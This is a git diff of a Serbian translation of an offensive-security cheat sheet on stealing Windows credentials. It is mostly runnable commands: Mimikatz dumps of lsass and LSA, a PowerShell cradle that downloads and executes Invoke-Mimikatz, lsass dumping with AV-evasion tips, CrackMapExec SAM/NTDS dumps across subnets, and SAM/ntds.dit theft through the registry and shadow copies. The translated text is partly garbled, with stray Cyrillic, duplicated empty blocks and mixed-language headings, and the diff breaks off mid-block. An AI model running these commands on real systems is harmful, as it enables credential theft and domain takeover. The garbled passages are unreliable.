@@ -1,20 +1,20 @@
-# Krađa Windows akreditacija
+# Krađa Windows Kredencijala
 
 <details>
 
-<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Naučite AWS hakovanje od početnika do eksperta sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Drugi načini podrške HackTricks-u:
+Drugi načini da podržite HackTricks:
 
-* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
+* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks** ili **preuzmete HackTricks u PDF formatu** pogledajte [**PRETPLATNIČKE PLANOVE**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
+* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Podelite svoje hakovanje trikove podnošenjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
 
-## Mimikatz akreditacije
+## Kredencijali Mimikatz
 ```bash
 #Elevate Privileges to extract the credentials
 privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
@@ -28,7 +28,7 @@ lsadump::sam
 #One liner
 mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
 ```
-**Pronađite druge stvari koje Mimikatz može uraditi na** [**ovoj stranici**](credentials-mimikatz.md)**.**
+**Pronađite druge stvari koje Mimikatz može da uradi na** [**ovoj stranici**](credentials-mimikatz.md)**.**
 
 ### Invoke-Mimikatz
 ```bash
@@ -36,11 +36,11 @@ IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercont
 Invoke-Mimikatz -DumpCreds #Dump creds from memory
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
 ```
-[**Saznajte o nekim mogućim zaštitama za pristupne podatke ovde.**](credentials-protections.md) **Ove zaštite mogu sprečiti izvlačenje nekih pristupnih podataka pomoću alata Mimikatz.**
+[**Saznajte više o mogućim zaštitama za akreditive ovde.**](credentials-protections.md) **Ove zaštite mogu sprečiti Mimikatz da izvuče neke akreditive.**
 
-## Pristupni podaci sa Meterpreterom
+## Akreditive sa Meterpreter-om
 
-Koristite [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **koji sam kreirao da biste pretražili lozinke i hešove** unutar žrtve.
+Koristite [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **koji** sam kreirao da **tražite lozinke i hash-eve** unutar žrtve.
 ```bash
 #Credentials from SAM
 post/windows/gather/smart_hashdump
@@ -57,14 +57,14 @@ mimikatz_command -f "sekurlsa::logonpasswords"
 mimikatz_command -f "lsadump::lsa /inject"
 mimikatz_command -f "lsadump::sam"
 ```
-## Zaobilaženje AV
+## Zaobilaženje AV-a
 
 ### Procdump + Mimikatz
 
-Kako je **Procdump iz** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**legitimni Microsoft alat**, nije otkriven od strane Defendera.\
-Možete koristiti ovaj alat da **dampirate lsass proces**, **preuzmete dump** i **izvučete** **lokalno** kredencijale iz dumpa.
+Kako je **Procdump iz** [**SysInternals**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) **legitiman Microsoft alat**, Defender ga ne detektuje.\
+Možete koristiti ovaj alat da **izvršite dump lsass procesa**, **preuzmete dump** i **izvučete** **poverljive podatke lokalno** iz dump-a.
 
-{% code title="Dampiranje lsass" %}
+{% code title="Dump lsass" %}
 ```bash
 #Local
 C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
@@ -72,7 +72,13 @@ C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 net use Z: https://live.sysinternals.com
 Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 ```
-{% code title="Izdvajanje podataka za prijavljivanje iz dump-a" %}
+{% endcode %}
+
+{% code title="Extract credentials from the dump" %}
+
+{% endcode %}
+
+{% code title="Extract credentials from the dump" %}
 ```c
 //Load the dump
 mimikatz # sekurlsa::minidump lsass.dmp
@@ -81,46 +87,46 @@ mimikatz # sekurlsa::logonPasswords
 ```
 {% endcode %}
 
-Ovaj proces se automatski izvršava pomoću [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
+Ovaj proces se automatski obavlja pomoću [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
-**Napomena**: Neki **AV** programi mogu **detektovati** kao **zlonamerno** korišćenje **procdump.exe za dumpovanje lsass.exe**, to je zato što detektuju stringove **"procdump.exe" i "lsass.exe"**. Zato je **diskretnije** proslediti **PID** lsass.exe procesa kao **argument** procdump-u **umesto** imena lsass.exe.
+**Napomena**: Neki **AV** mogu **detektovati** kao **maliciozno** korišćenje **procdump.exe za dump lsass.exe**, jer **detektuju** stringove **"procdump.exe" i "lsass.exe"**. Zato je **diskretnije** **proslediti** kao **argument** **PID** lsass.exe procdump-u **umesto** imena lsass.exe.
 
-### Dumpovanje lsass pomoću **comsvcs.dll**
+### Dumping lsass sa **comsvcs.dll**
 
-DLL fajl pod nazivom **comsvcs.dll** koji se nalazi u `C:\Windows\System32` je odgovoran za **dumpovanje memorije procesa** u slučaju pada. Ovaj DLL sadrži funkciju pod nazivom **`MiniDumpW`**, koja se poziva pomoću `rundll32.exe`.\
-Prva dva argumenta su nebitna, ali treći argument se sastoji od tri komponente. Prva komponenta predstavlja ID procesa koji će biti dumpovan, druga komponenta predstavlja lokaciju fajla za dump, a treća komponenta je strogo reč **full**. Ne postoje alternativne opcije.\
-Nakon parsiranja ovih tri komponente, DLL kreira fajl za dumpovanje i prenosi memoriju određenog procesa u taj fajl.\
-Korišćenje **comsvcs.dll** je moguće za dumpovanje lsass procesa, čime se eliminiše potreba za otpremanjem i izvršavanjem procdump-a. Ovaj metod je detaljno opisan na [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
+DLL pod nazivom **comsvcs.dll** koji se nalazi u `C:\Windows\System32` je odgovoran za **dumpovanje memorije procesa** u slučaju pada. Ovaj DLL uključuje **funkciju** pod nazivom **`MiniDumpW`**, koja je dizajnirana da se poziva pomoću `rundll32.exe`.\
+Nije bitno koristiti prva dva argumenta, ali treći je podeljen na tri komponente. Prva komponenta je ID procesa koji se dump-uje, druga komponenta je lokacija dump fajla, a treća komponenta je striktno reč **full**. Ne postoje alternativne opcije.\
+Nakon parsiranja ove tri komponente, DLL se angažuje u kreiranju dump fajla i prebacivanju memorije specificiranog procesa u ovaj fajl.\
+Korišćenje **comsvcs.dll** je izvodljivo za dumpovanje lsass procesa, čime se eliminiše potreba za upload-om i izvršavanjem procdump-a. Ova metoda je detaljno opisana na [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
 
-Za izvršavanje se koristi sledeća komanda:
+Sledeća komanda se koristi za izvršenje:
 ```bash
 rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
 ```
-**Ovaj proces možete automatizovati pomoću** [**lssasy**](https://github.com/Hackndo/lsassy)**.**
+**Možete automatizovati ovaj proces sa** [**lssasy**](https://github.com/Hackndo/lsassy)**.**
 
-### **Izbacivanje lsass-a pomoću Task Manager-a**
+### **Dumpovanje lsass sa Task Manager-om**
 
 1. Desni klik na Task Bar i kliknite na Task Manager
-2. Kliknite na Više detalja
-3. Pretražite proces "Local Security Authority Process" na kartici Procesi
+2. Kliknite na More details
+3. Pretražite proces "Local Security Authority Process" u tabu Processes
 4. Desni klik na proces "Local Security Authority Process" i kliknite na "Create dump file".
 
-### Izbacivanje lsass-a pomoću procdump-a
+### Dumpovanje lsass sa procdump-om
 
-[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) je Microsoft potpisani binarni fajl koji je deo [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) paketa.
+[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) je Microsoft potpisani binarni fajl koji je deo [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite-a.
 ```
 Get-Process -Name LSASS
 .\procdump.exe -ma 608 lsass.dmp
 ```
-## Dumpiranje lsass-a pomoću PPLBlade-a
+## Dumpin lsass with PPLBlade
 
-[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) je alat za dumpiranje zaštićenih procesa koji podržava obfuskaciju memorijskog dumpa i prenos na udaljene radne stanice bez otpuštanja na disk.
+[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) је алат за заштићено процесно дамповање који подржава обфускацију меморијског дампа и пренос на удаљене радне станице без записивања на диск.
 
-**Ključne funkcionalnosti**:
+**Кључне функционалности**:
 
-1. Zaobilaženje PPL zaštite
-2. Obfuskacija datoteka memorijskog dumpa kako bi se izbegli mehanizmi detekcije na osnovu potpisa Defender-a
-3. Prenos memorijskog dumpa pomoću metoda RAW i SMB bez otpuštanja na disk (bezdatotečni dump)
+1. Заобилажење PPL заштите
+2. Обфускација меморијских дамп фајлова ради избегавања Defender механизама детекције заснованих на потписима
+3. Отпремање меморијског дампа са RAW и SMB методама отпремања без записивања на диск (дамп без фајлова)
 
 {% code overflow="wrap" %}
 ```bash
@@ -130,98 +136,80 @@ PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmod
 
 ## CrackMapExec
 
-### Dumpovanje SAM heševa
+### Dump SAM hashes
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 ```
-### Preuzimanje LSA tajni
+### Dump LSA secrets
 
-Kada je reč o krađi legitimacija, jedna od metoda koju možete koristiti je preuzimanje LSA (Local Security Authority) tajni. LSA tajne su čuvane na Windows operativnom sistemu i sadrže osetljive informacije kao što su korisnička imena i lozinke.
+### Korišćenje mimikatz
 
-Da biste preuzeli LSA tajne, možete koristiti alat kao što je "Mimikatz". Ovaj alat omogućava da se izvrši "sekundarni logon" na Windows mašini i preuzmu LSA tajne.
+```shell
+mimikatz # sekurlsa::logonpasswords
+```
 
-Evo kako možete izvršiti ovu tehniku:
+### Korišćenje procdump
 
-1. Preuzmite "Mimikatz" alat sa zvanične web stranice.
-2. Pokrenite "Mimikatz" alat na ciljnom Windows sistemu.
-3. Izvršite "sekundarni logon" komandom `sekurlsa::logonpasswords`.
-4. Prikupite preuzete LSA tajne koje sadrže korisnička imena i lozinke.
+```shell
+procdump -accepteula -ma lsass.exe lsass.dmp
+mimikatz # sekurlsa::minidump lsass.dmp
+mimikatz # sekurlsa::logonpasswords
+```
 
-Važno je napomenuti da je ova tehnika ilegalna i može biti kršenje privatnosti. Upotreba ovog alata treba biti u skladu sa zakonima i regulativama.
+### Korišćenje comsvcs
+
+```shell
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 1234 C:\Windows\Temp\lsass.dmp full
+mimikatz # sekurlsa::minidump lsass.dmp
+mimikatz # sekurlsa::logonpasswords
+```
+
+### Korišćenje Task Manager
+
+1. Otvorite Task Manager
+2. Desni klik na `lsass.exe` proces
+3. Kliknite na `Create dump file`
+4. Kopirajte .dmp fajl na sistem sa mimikatz
+5. Učitajte .dmp fajl u mimikatz
+
+```shell
+mimikatz # sekurlsa::minidump lsass.dmp
+mimikatz # sekurlsa::logonpasswords
+```
+
+### Korišćenje Process Explorer
+
+1. Otvorite Process Explorer
+2. Desni klik na `lsass.exe` proces
+3. Kliknite na `Create Dump` > `Create Full Dump`
+4. Kopirajte .dmp fajl na sistem sa mimikatz
+5. Učitajte .dmp fajl u mimikatz
+
+```shell
+mimikatz # sekurlsa::minidump lsass.dmp
+mimikatz # sekurlsa::logonpasswords
+```
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 ```
-### Dumpujte NTDS.dit sa ciljnog DC-a
-
-Da biste izvršili ovu tehniku, možete koristiti alat kao što je `mimikatz` ili `ntdsutil`. Ovi alati omogućavaju izvlačenje NTDS.dit baze podataka sa ciljnog kontrolera domena (DC).
-
-#### Korišćenje alata `mimikatz`
-
-1. Preuzmite `mimikatz` alat sa [zvanične GitHub stranice](https://github.com/gentilkiwi/mimikatz/releases).
-2. Pokrenite `mimikatz` alat na ciljnom DC-u.
-3. Unesite komandu `lsadump::dcsync /domain:<ime domena>` kako biste izvršili izvlačenje NTDS.dit baze podataka.
-
-#### Korišćenje alata `ntdsutil`
-
-1. Pokrenite `cmd.exe` kao administrator na ciljnom DC-u.
-2. Unesite komandu `ntdsutil` kako biste pokrenuli `ntdsutil` alat.
-3. Unesite komandu `activate instance ntds` kako biste aktivirali instancu NTDS.dit baze podataka.
-4. Unesite komandu `ifm` kako biste prešli u režim "Install from Media".
-5. Unesite komandu `create full <putanja>` kako biste kreirali punu kopiju NTDS.dit baze podataka na određenoj putanji.
-
-Nakon izvršenja ovih koraka, dobićete kopiju NTDS.dit baze podataka sa ciljnog DC-a. Ova baza podataka sadrži hash-ove korisničkih naloga i može se koristiti za dalje analize i napade na sistem.
+### Izdvajanje NTDS.dit sa ciljanog DC
 ```
 cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
 ```
-### Preuzmite istoriju lozinki NTDS.dit sa ciljnog DC-a
-
-Da biste preuzeli istoriju lozinki NTDS.dit sa ciljnog kontrolera domena (DC), možete koristiti sledeće korake:
-
-1. Pokrenite alat `ntdsutil` na ciljnom DC-u.
-2. Unesite komandu `activate instance ntds` kako biste aktivirali instancu NTDS.
-3. Unesite komandu `ifm` kako biste prešli na režim instalacije izolovane mape.
-4. Unesite komandu `create full C:\path\to\output` kako biste kreirali izolovanu mapu sa punim sadržajem.
-5. Unesite komandu `quit` kako biste izašli iz režima instalacije izolovane mape.
-6. Unesite komandu `quit` kako biste izašli iz alata `ntdsutil`.
-
-Nakon izvršavanja ovih koraka, istorija lozinki NTDS.dit će biti preuzeta i smeštena u izolovanu mapu koju ste odredili.
+### Izdvajanje NTDS.dit istorije lozinki sa ciljanog DC-a
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
 ```
-### Prikazivanje atributa pwdLastSet za svaki NTDS.dit nalog
-
-Da biste prikazali atribut pwdLastSet za svaki NTDS.dit nalog, možete koristiti sledeći PowerShell skript:
-
-```powershell
-$ntds = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().GetDirectoryEntry()
-$searcher = New-Object System.DirectoryServices.DirectorySearcher($ntds)
-$searcher.Filter = "(objectClass=user)"
-$searcher.PropertiesToLoad.Add("pwdLastSet")
-
-$results = $searcher.FindAll()
-
-foreach ($result in $results) {
-    $user = $result.GetDirectoryEntry()
-    $pwdLastSet = [System.DateTime]::FromFileTime($user.Properties["pwdLastSet"].Value)
-
-    Write-Host "Account: $($user.Properties["sAMAccountName"].Value)"
-    Write-Host "pwdLastSet: $pwdLastSet"
-    Write-Host ""
-}
-
-$searcher.Dispose()
-```
-
-Ovaj skript će prikazati atribut pwdLastSet za svaki NTDS.dit nalog, zajedno sa odgovarajućim korisničkim imenom (sAMAccountName).
+### Prikaži atribut pwdLastSet za svaki NTDS.dit nalog
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
 ```
-## Krađa SAM i SYSTEM fajlova
+## Krađa SAM & SYSTEM
 
-Ovi fajlovi se **nalaze** u _C:\windows\system32\config\SAM_ i _C:\windows\system32\config\SYSTEM._ Ali **ne možete ih jednostavno kopirati** jer su zaštićeni.
+Ovi fajlovi bi trebalo da budu **locirani** u _C:\windows\system32\config\SAM_ i _C:\windows\system32\config\SYSTEM._ Ali **ne možete ih jednostavno kopirati na uobičajen način** jer su zaštićeni.
 
-### Iz registra
+### Iz Registra
 
 Najlakši način da ukradete ove fajlove je da dobijete kopiju iz registra:
 ```
@@ -229,22 +217,22 @@ reg save HKLM\sam sam
 reg save HKLM\system system
 reg save HKLM\security security
 ```
-**Preuzmite** te datoteke na vaš Kali uređaj i **izvucite hešove** koristeći:
+**Preuzmite** te fajlove na vašu Kali mašinu i **izvucite hash-eve** koristeći:
 ```
 samdump2 SYSTEM SAM
 impacket-secretsdump -sam sam -security security -system system LOCAL
 ```
-### Kopiranje senke zapisa
+### Volume Shadow Copy
 
-Možete izvršiti kopiranje zaštićenih datoteka koristeći ovu uslugu. Potrebno je da budete Administrator.
+Možete izvršiti kopiranje zaštićenih fajlova koristeći ovu uslugu. Morate biti Administrator.
 
 #### Korišćenje vssadmin
 
-Binarna datoteka vssadmin je dostupna samo u verzijama Windows Servera.
+vssadmin binarni fajl je dostupan samo u Windows Server verzijama
 ```bash
 vssadmin create shadow /for=C:
 #Copy SAM
-copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SAM
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
 #Copy SYSTEM
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
 #Copy ntds.dit
@@ -253,7 +241,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Ex
 # You can also create a symlink to the shadow copy and access it
 mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
 ```
-Ali isto možete uraditi i iz **Powershell**-a. Ovo je primer **kako kopirati SAM fajl** (hard disk koji se koristi je "C:" i čuva se na C:\users\Public), ali možete koristiti ovo za kopiranje bilo kog zaštićenog fajla:
+Ali možete isto uraditi iz **Powershell**-a. Ovo je primer **kako kopirati SAM fajl** (korišćeni hard disk je "C:" i fajl je sačuvan u C:\users\Public) ali možete koristiti ovo za kopiranje bilo kog zaštićenog fajla:
 ```bash
 $service=(Get-Service -name VSS)
 if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
@@ -262,90 +250,88 @@ $volume=(gwmi win32_shadowcopy -filter "ID='$id'")
 cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
 $voume.Delete();if($notrunning -eq 1){$service.Stop()}
 ```
-Kod iz knjige: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
-
 ### Invoke-NinjaCopy
 
-Konačno, takođe možete koristiti [**PS skriptu Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) da napravite kopiju SAM, SYSTEM i ntds.dit fajlova.
+Na kraju, možete koristiti i [**PS skriptu Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) da napravite kopiju SAM, SYSTEM i ntds.dit.
 ```bash
 Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
 ```
 ## **Active Directory Credentials - NTDS.dit**
 
-Fajl **NTDS.dit** poznat je kao srce **Active Directory-ja**, u kojem se čuvaju ključni podaci o korisničkim objektima, grupama i njihovim članstvima. Tu se čuvaju **heševi lozinki** za korisnike domena. Ovaj fajl je baza podataka **Extensible Storage Engine (ESE)** i nalazi se na putanji **_%SystemRoom%/NTDS/ntds.dit_**.
+Datoteka **NTDS.dit** je poznata kao srce **Active Directory**, koja sadrži ključne podatke o korisničkim objektima, grupama i njihovim članstvima. Tu se čuvaju **hashovi lozinki** za domenske korisnike. Ova datoteka je baza podataka **Extensible Storage Engine (ESE)** i nalazi se na **_%SystemRoom%/NTDS/ntds.dit_**.
 
-U ovoj bazi podataka održavaju se tri osnovne tabele:
+Unutar ove baze podataka, održavaju se tri glavne tabele:
 
-- **Data Table**: Ova tabela čuva detalje o objektima kao što su korisnici i grupe.
-- **Link Table**: Prati odnose, poput članstva u grupama.
-- **SD Table**: Ovde se čuvaju **bezbednosni deskriptori** za svaki objekat, obezbeđujući bezbednost i kontrolu pristupa za čuvane objekte.
+- **Data Table**: Ova tabela je zadužena za čuvanje detalja o objektima kao što su korisnici i grupe.
+- **Link Table**: Prati odnose, kao što su članstva u grupama.
+- **SD Table**: **Sigurnosni deskriptori** za svaki objekat se čuvaju ovde, osiguravajući sigurnost i kontrolu pristupa za pohranjene objekte.
 
-Više informacija o tome: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
+Više informacija o ovome: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
 
-Windows koristi _Ntdsa.dll_ za interakciju sa tim fajlom, a koristi ga _lsass.exe_. Zatim, **deo** fajla **NTDS.dit** može se nalaziti **unutar memorije `lsass`-a** (možete pronaći najskorije pristupljene podatke verovatno zbog poboljšanja performansi korišćenjem **keša**).
+Windows koristi _Ntdsa.dll_ za interakciju sa tom datotekom i koristi ga _lsass.exe_. Zatim, **deo** datoteke **NTDS.dit** može biti lociran **unutar memorije `lsass`** (možete pronaći najnovije pristupane podatke verovatno zbog poboljšanja performansi korišćenjem **keša**).
 
-#### Dekriptovanje heševa unutar NTDS.dit
+#### Dešifrovanje hashova unutar NTDS.dit
 
-Heš je šifrovan 3 puta:
+Hash je šifrovan 3 puta:
 
-1. Dekriptujte ključ za šifrovanje lozinke (**PEK**) koristeći **BOOTKEY** i **RC4**.
-2. Dekriptujte **heš** koristeći **PEK** i **RC4**.
-3. Dekriptujte **heš** koristeći **DES**.
+1. Dešifrujte ključ za šifrovanje lozinke (**PEK**) koristeći **BOOTKEY** i **RC4**.
+2. Dešifrujte **hash** koristeći **PEK** i **RC4**.
+3. Dešifrujte **hash** koristeći **DES**.
 
-**PEK** ima **istu vrednost** na **svakom kontroloru domena**, ali je **šifrovan** unutar fajla **NTDS.dit** koristeći **BOOTKEY** iz **SYSTEM fajla kontrolora domena (razlikuje se između kontrolora domena)**. Zato da biste dobili akreditive iz NTDS.dit fajla **potrebni su vam fajlovi NTDS.dit i SYSTEM** (_C:\Windows\System32\config\SYSTEM_).
+**PEK** ima **istu vrednost** u **svakom kontroleru domena**, ali je **šifrovan** unutar datoteke **NTDS.dit** koristeći **BOOTKEY** iz **SYSTEM datoteke kontrolera domena (razlikuje se između kontrolera domena)**. Zbog toga, da biste dobili kredencijale iz NTDS.dit datoteke, **potrebne su vam datoteke NTDS.dit i SYSTEM** (_C:\Windows\System32\config\SYSTEM_).
 
-### Kopiranje NTDS.dit pomoću Ntdsutil
+### Kopiranje NTDS.dit koristeći Ntdsutil
 
 Dostupno od Windows Server 2008.
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
-Takođe možete koristiti trik sa [**kopiranjem kopije senke zapisa**](./#stealing-sam-and-system) da biste kopirali datoteku **ntds.dit**. Zapamtite da će vam takođe biti potrebna kopija datoteke **SYSTEM** (ponovo, [**izvucite je iz registra ili koristite trik sa kopiranjem kopije senke zapisa**](./#stealing-sam-and-system)).
+Takođe možete koristiti trik sa [**volume shadow copy**](./#stealing-sam-and-system) da kopirate **ntds.dit** fajl. Zapamtite da će vam takođe trebati kopija **SYSTEM file** (opet, [**izvadite ga iz registra ili koristite volume shadow copy**](./#stealing-sam-and-system) trik).
 
-### **Izdvajanje heševa iz NTDS.dit**
+### **Ekstrakcija hash-eva iz NTDS.dit**
 
-Kada ste **dobili** datoteke **NTDS.dit** i **SYSTEM**, možete koristiti alate poput _secretsdump.py_ da biste **izvukli heševe**:
+Kada ste **dobavili** fajlove **NTDS.dit** i **SYSTEM**, možete koristiti alate kao što je _secretsdump.py_ da **izvučete hash-eve**:
 ```bash
 secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
 ```
-Takođe možete **automatski izvući** koristeći važećeg korisnika sa administratorskim privilegijama na domenu:
+Takođe možete **automatski ih izvući** koristeći validnog domen admin korisnika:
 ```
 secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
 ```
-Za **velike NTDS.dit datoteke** preporučuje se da se izvuku koristeći [gosecretsdump](https://github.com/c-sto/gosecretsdump).
+Za **velike NTDS.dit fajlove** preporučuje se ekstrakcija koristeći [gosecretsdump](https://github.com/c-sto/gosecretsdump).
 
-Takođe, možete koristiti **metasploit modul**: _post/windows/gather/credentials/domain\_hashdump_ ili **mimikatz** `lsadump::lsa /inject`
+Na kraju, možete koristiti i **metasploit modul**: _post/windows/gather/credentials/domain\_hashdump_ ili **mimikatz** `lsadump::lsa /inject`
 
-### **Izdvajanje objekata domena iz NTDS.dit u SQLite bazu podataka**
+### **Ekstrakcija domen objekata iz NTDS.dit u SQLite bazu podataka**
 
-NTDS objekti mogu se izdvojiti u SQLite bazu podataka pomoću [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Ne samo da se izdvajaju tajne, već i celokupni objekti i njihove atribute za dalje izdvajanje informacija kada je sirova NTDS.dit datoteka već preuzeta.
+NTDS objekti mogu biti ekstrahovani u SQLite bazu podataka pomoću [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Ne samo da se tajne ekstrahuju, već i čitavi objekti i njihovi atributi za dalju ekstrakciju informacija kada je sirovi NTDS.dit fajl već preuzet.
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
-`SYSTEM` košnica je opcionalna, ali omogućava dešifrovanje tajni (NT i LM heševa, dodatnih akreditacija kao što su lozinke u čistom tekstu, kerberos ili ključevi poverenja, NT i LM istorija lozinki). Pored ostalih informacija, izvučeni su sledeći podaci: korisnički i mašinski nalozi sa njihovim heševima, UAC oznake, vremenska oznaka za poslednju prijavu i promenu lozinke, opis naloga, imena, UPN, SPN, grupe i rekurzivna članstva, stablo organizacionih jedinica i članstvo, povereni domeni sa vrstama poverenja, smerom i atributima...
+`SYSTEM` hive je opcionalan, ali omogućava dešifrovanje tajni (NT & LM hash-evi, dopunske akreditive kao što su lozinke u čistom tekstu, kerberos ili trust ključevi, NT & LM istorije lozinki). Pored ostalih informacija, sledeći podaci se izvlače: korisnički i mašinski nalozi sa njihovim hash-evima, UAC zastavice, vremenska oznaka za poslednju prijavu i promenu lozinke, opisi naloga, imena, UPN, SPN, grupe i rekurzivna članstva, stablo organizacionih jedinica i članstvo, pouzdani domeni sa tipom poverenja, smerom i atributima...
 
 ## Lazagne
 
-Preuzmite binarnu datoteku sa [ovde](https://github.com/AlessandroZ/LaZagne/releases). Možete koristiti ovu binarnu datoteku da izvučete akreditive iz različitog softvera.
+Preuzmite binarni fajl sa [ovde](https://github.com/AlessandroZ/LaZagne/releases). Možete koristiti ovaj binarni fajl za ekstrakciju akreditiva iz nekoliko softvera.
 ```
 lazagne.exe all
 ```
-## Ostali alati za izvlačenje akreditacija iz SAM i LSASS
+## Ostali alati za ekstrakciju kredencijala iz SAM i LSASS
 
-### Windows Credentials Editor (WCE)
+### Windows credentials Editor (WCE)
 
-Ovaj alat se može koristiti za izvlačenje akreditacija iz memorije. Preuzmite ga sa: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
+Ovaj alat može se koristiti za ekstrakciju kredencijala iz memorije. Preuzmite ga sa: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
 
 ### fgdump
 
-Izvucite akreditacije iz SAM datoteke
+Ekstrakcija kredencijala iz SAM fajla
 ```
 You can find this binary inside Kali, just do: locate fgdump.exe
 fgdump.exe
 ```
 ### PwDump
 
-Izvucite akreditive iz SAM datoteke
+Ekstraktujte kredencijale iz SAM fajla
 ```
 You can find this binary inside Kali, just do: locate pwdump.exe
